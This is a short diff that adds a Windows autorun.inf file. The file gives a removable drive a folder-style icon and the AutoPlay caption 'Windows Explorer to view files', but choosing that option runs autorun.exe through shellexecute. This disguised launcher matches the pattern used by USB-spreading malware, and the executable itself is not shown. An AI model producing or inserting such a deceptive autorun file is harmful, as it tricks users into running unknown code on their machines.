@@ -1,0 +1,4 @@
+[autorun]
+icon=%SystemRoot%\system32\SHELL32.dll,8
+ACTION=Windows Explorer to view files
+shellexecute= autorun.exe
